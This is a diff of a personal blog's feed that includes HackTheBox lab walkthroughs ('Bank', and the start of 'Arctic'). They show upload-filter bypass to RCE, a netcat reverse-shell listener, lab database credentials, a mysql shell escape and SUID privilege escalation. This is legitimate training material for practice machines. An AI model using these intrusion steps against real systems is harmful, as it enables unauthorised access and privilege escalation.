-&lt;p&gt;&lt;strong&gt;Error&lt;/strong&gt;: If the build throws up an error then copy the relevant files illustrated in the error message into &lt;code class=&quot;highlighter-rouge&quot;&gt;buildroot/output/images/&lt;/code&gt; directory. If the directory doesn’t exist then create it. The build files will be in the &lt;code class=&quot;highlighter-rouge&quot;&gt;output/images/&lt;/code&gt; directory so the next stage is to flash partition 2 of the SD card with the root filesystem. Check where your block device resides before flashing as you may destroy your disk:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Error&lt;/strong&gt;: If the build throws up an error then copy the relevant files illustrated in the error message into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buildroot/output/images/&lt;/code&gt; directory. If the directory doesn’t exist then create it. The build files will be in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output/images/&lt;/code&gt; directory so the next stage is to flash partition 2 of the SD card with the root filesystem. Check where your block device resides before flashing as you may destroy your disk:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
 Device     Boot   Start      End  Sectors  Size Id Type
 /dev/sdb1  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;       2048  2086911  2084864 1018M  c W95 FAT32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LBA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 /dev/sdb2       2086912 15564799 13477888  6.4G 83 Linux
 
-emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;output/images/rootfs.ext4 &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/sdb2
+emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;output/images/rootfs.ext4 &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/sdb2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
@@ -519,7 +519,7 @@ emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &
 
 &lt;p&gt;Unmount, eject and place the SD card into the Beaglebone Black. The serial console will now show the operating system booting up a lightweight custom embedded Linux distribution.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/embedded/bb-linux/buildroot.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Emmet Friel</name></author><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/embedded/bb-linux/linux.jpg" /></entry><entry><title type="html">HackTheBox Walkthrough - Bank</title><link href="http://localhost:4000/ef_blog/hackthebox/bank.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Bank" /><published>2020-04-16T00:00:00-07:00</published><updated>2020-04-16T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/hackthebox/bank</id><content type="html" xml:base="http://localhost:4000/ef_blog/hackthebox/bank.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/buildroot.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="embedded" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/embedded/bb-linux/linux.jpg" /><media:content medium="image" url="http://localhost:4000/ef_blog/embedded/bb-linux/linux.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Walkthrough - Bank</title><link href="http://localhost:4000/ef_blog/hackthebox/bank.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Bank" /><published>2020-04-16T00:00:00-07:00</published><updated>2020-04-16T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/hackthebox/bank</id><content type="html" xml:base="http://localhost:4000/ef_blog/hackthebox/bank.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Bank is an “easy” machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.&lt;/p&gt;
 
 &lt;h1 id=&quot;recon-and-enumeration&quot;&gt;Recon and Enumeration&lt;/h1&gt;
@@ -574,7 +574,7 @@ Name:   bank.htb
 Address: 10.10.10.29
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The default name server for all HackTheBox machines is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;name of box&amp;gt;.htb&lt;/code&gt; so I tried that and got a response.&lt;/p&gt;
+&lt;p&gt;The default name server for all HackTheBox machines is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;name of box&amp;gt;.htb&lt;/code&gt; so I tried that and got a response.&lt;/p&gt;
 
 &lt;h1 id=&quot;dns-enumeration---dig&quot;&gt;DNS Enumeration - dig&lt;/h1&gt;
 
@@ -598,13 +598,13 @@ bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 6048
 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 6 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Added &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.29 bank.htb&lt;/code&gt; to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file and I was able to resolve bank.htb.&lt;/p&gt;
+&lt;p&gt;Added &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.29 bank.htb&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file and I was able to resolve bank.htb.&lt;/p&gt;
 
 &lt;h1 id=&quot;enumeration--webpage&quot;&gt;Enumeration – Webpage&lt;/h1&gt;
 
-&lt;p&gt;Navigating to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://bank.htb/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Navigating to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://bank.htb/&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/htb/bank/bank-htb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/bank-htb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Using the dirsearch tool I ran a scan to check for additional php files on the webserver. The tool is similar to dirb but dirsearch has alot of additional features.&lt;/p&gt;
 
@@ -616,7 +616,7 @@ bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 6048
 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;: follow redirects
 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;: 20 threads
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;While that was running I ran a Nikto scan that showed the page was being redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/login.php&lt;/code&gt; and you can verify this by using CURL to get the HTTP headers.&lt;/p&gt;
+&lt;p&gt;While that was running I ran a Nikto scan that showed the page was being redirected to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login.php&lt;/code&gt; and you can verify this by using CURL to get the HTTP headers.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/bank# curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://bank.htb/
 HTTP/1.1 302 Found
@@ -664,20 +664,20 @@ Task Completed
 
 &lt;h1 id=&quot;stopping-redirects-using-burpsuite&quot;&gt;Stopping Redirects using Burpsuite&lt;/h1&gt;
 
-&lt;p&gt;I’m going to stop the index.php redirect first of all and to perform this, catch the initial request and then go to Actions –&amp;gt; Do intercept –&amp;gt; Response to this request then replace &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP/1.1 302 Found&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP/1.1 200 OK&lt;/code&gt; and then forward. To do this automatically for every page, from the proxy tab at the top go to options then “Match and Replace”, put in your rule, make sure its enabled and then turn intercept off. The rule you can see below.&lt;/p&gt;
+&lt;p&gt;I’m going to stop the index.php redirect first of all and to perform this, catch the initial request and then go to Actions –&amp;gt; Do intercept –&amp;gt; Response to this request then replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/1.1 302 Found&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/1.1 200 OK&lt;/code&gt; and then forward. To do this automatically for every page, from the proxy tab at the top go to options then “Match and Replace”, put in your rule, make sure its enabled and then turn intercept off. The rule you can see below.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/htb/bank/replace302.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/replace302.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;You can navigate to all websites now without being redirected, one in particular was an unrendered support.php page which gives us the ability to upload files. With some trial and error I could get an image uploaded successfully with php code encapsulated however I couldnt get any RCE on the webpage and also I fired up burp to see WTH was going on and it seems the webpage kept trying to redirect to &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt; after uploading the images which seemed strange considering we created that rule. The webpage wouldn’t let me delete the files so I tried searching elsewhere in the meantime.&lt;/p&gt;
+&lt;p&gt;You can navigate to all websites now without being redirected, one in particular was an unrendered support.php page which gives us the ability to upload files. With some trial and error I could get an image uploaded successfully with php code encapsulated however I couldnt get any RCE on the webpage and also I fired up burp to see WTH was going on and it seems the webpage kept trying to redirect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; after uploading the images which seemed strange considering we created that rule. The webpage wouldn’t let me delete the files so I tried searching elsewhere in the meantime.&lt;/p&gt;
 
 &lt;h1 id=&quot;further-enumeration-of-the-webpage&quot;&gt;Further Enumeration of the Webpage&lt;/h1&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/htb/bank/balance-transfer.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/balance-transfer.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;On this directory there is a load of encrypted files so I downloaded everything using wget and then sorted the files by filesize in reverse order. All the files were around the same size except one.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/bank/# wget &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; http://bank.htb/balance-transfer/
-root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt; | sort &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
 root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;68576f20e9732f1b2edc4df5b8533230.acc
 &lt;span class=&quot;nt&quot;&gt;--ERR&lt;/span&gt; ENCRYPT FAILED
 +&lt;span class=&quot;o&quot;&gt;=================&lt;/span&gt;+
@@ -694,18 +694,18 @@ Balance: 8842803 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAccount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Logged into the portal using the email and password, navigated to &lt;strong&gt;“Support”&lt;/strong&gt; and I came to the &lt;code class=&quot;highlighter-rouge&quot;&gt;support.php&lt;/code&gt; page which I was enumerating earlier, this time the webpage was correctly rendered so I may have better luck this time. I uploaded a GIF file with php code in it (test.gif.php) and the response was declined as it only allows images. I fired up burp to see the response and I came across something interesting. I changed the extension to htb and tried again. Success, it uploaded and I had RCE (remote code execution).&lt;/p&gt;
+&lt;p&gt;Logged into the portal using the email and password, navigated to &lt;strong&gt;“Support”&lt;/strong&gt; and I came to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; page which I was enumerating earlier, this time the webpage was correctly rendered so I may have better luck this time. I uploaded a GIF file with php code in it (test.gif.php) and the response was declined as it only allows images. I fired up burp to see the response and I came across something interesting. I changed the extension to htb and tried again. Success, it uploaded and I had RCE (remote code execution).&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/htb/bank/debug.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/debug.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;shell-access&quot;&gt;Shell Access&lt;/h1&gt;
 
-&lt;p&gt;Having RCE, its time to get a shell into the machine. I setup my listener and connected back to my machine using netcat. You can check whether the victim has nc installed by running: &lt;code class=&quot;highlighter-rouge&quot;&gt;?cmd=which nc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Having RCE, its time to get a shell into the machine. I setup my listener and connected back to my machine using netcat. You can check whether the victim has nc installed by running: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?cmd=which nc&lt;/code&gt;&lt;/p&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/bank/rce.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/bank/rce.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -721,7 +721,7 @@ Balance: 8842803 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
 www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;^Z  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CTRL+Z MOVE IT TO THE BACKGROUND&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]+  Stopped                 nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 443
-root@kali:~/Documents/boxes/bank# stty raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
+root@kali:~/Documents/boxes/bank# &lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Type &lt;span class=&quot;nb&quot;&gt;fg &lt;/span&gt;and &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;hit ENTER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 root@kali:~/Documents/boxes/bank# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 443
 www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
@@ -733,7 +733,7 @@ www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&
 
 &lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
 
-&lt;p&gt;Now that were in the victim’s machine, its time to find a way to escalate. Navigating around the root directory of the webserver: &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/bank/&lt;/code&gt; I came across some mysql credentials in the &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;Now that were in the victim’s machine, its time to find a way to escalate. Navigating around the root directory of the webserver: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bank/&lt;/code&gt; I came across some mysql credentials in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inc&lt;/code&gt; directory.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;getCreditCards&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
                 &lt;span class=&quot;nv&quot;&gt;$mysql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new mysqli&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;!@#S3cur3P4ssw0rd!@#&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;htbbank&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -741,12 +741,12 @@ www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&
 
 &lt;h2 id=&quot;mysql-enumeration&quot;&gt;MYSQL Enumeration&lt;/h2&gt;
 
-&lt;p&gt;Inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/bank/inc&lt;/code&gt; directory we see a user.php file with a mysql username and password. We can log into the mysql database with those credentials, drop into a shell and hope we are root.&lt;/p&gt;
+&lt;p&gt;Inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bank/inc&lt;/code&gt; directory we see a user.php file with a mysql username and password. We can log into the mysql database with those credentials, drop into a shell and hope we are root.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank:/var/www/bank/inc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; or &lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Your MySQL connection id is 345
+Your MySQL connection &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;is 345
 Server version: 5.5.55-0ubuntu0.14.04.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 
 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2000, 2017, Oracle and/or its affiliates. All rights reserved.
@@ -758,8 +758,8 @@ owners.
 Type &lt;span class=&quot;s1&quot;&gt;'help;'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'\h'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help. Type &lt;span class=&quot;s1&quot;&gt;'\c'&lt;/span&gt; to clear the current input statement.
 
 mysql&amp;gt; &lt;span class=&quot;se&quot;&gt;\!&lt;/span&gt; /bin/sh &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;COMMAND TO UPGRADE TO A SHELL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
-www-data
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;www-data
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Nope, no luck. We could try to SSH in using those credentials.&lt;/p&gt;
@@ -780,8 +780,8 @@ Permission denied, please try again.
 &lt;h3 id=&quot;searching-files-with-suid--sgid-bit-set&quot;&gt;Searching files with SUID &amp;amp; SGID bit set&lt;/h3&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Finding SGID bit files: &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data@bank: find / -perm -2000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Finding SUID bit files: &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data@bank: find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Finding SGID bit files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data@bank: find / -perm -2000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Finding SUID bit files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data@bank: find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank: find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
@@ -815,7 +815,7 @@ www-data@bank:/var/www/bank/inc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/
 root
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;You can see that there was a file called emergency that had a SUID bit so I executed it and voila, root!&lt;/p&gt;</content><author><name>Emmet Friel</name></author><summary type="html">Introduction Bank is an “easy” machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/htb/bank/bank.png" /></entry><entry><title type="html">HackTheBox Walkthrough - Arctic</title><link href="http://localhost:4000/ef_blog/hackthebox/arctic.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Arctic" /><published>2020-04-13T00:00:00-07:00</published><updated>2020-04-13T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/hackthebox/arctic</id><content type="html" xml:base="http://localhost:4000/ef_blog/hackthebox/arctic.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;You can see that there was a file called emergency that had a SUID bit so I executed it and voila, root!&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="HackTheBox" /><summary type="html">Introduction Bank is an “easy” machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/htb/bank/bank.png" /><media:content medium="image" url="http://localhost:4000/ef_blog/htb/bank/bank.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Walkthrough - Arctic</title><link href="http://localhost:4000/ef_blog/hackthebox/arctic.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Arctic" /><published>2020-04-13T00:00:00-07:00</published><updated>2020-04-13T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/hackthebox/arctic</id><content type="html" xml:base="http://localhost:4000/ef_blog/hackthebox/arctic.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Arctic is an “easy” Windows machine on Hackthebox.&lt;/p&gt;
 
@@ -853,7 +853,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/index.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/index.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -868,7 +868,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/portal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/portal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -883,7 +883,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/httpheaders.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/httpheaders.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -898,12 +898,12 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
   &lt;p&gt;“Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.”&lt;/p&gt;
 &lt;/blockquote&gt;
 
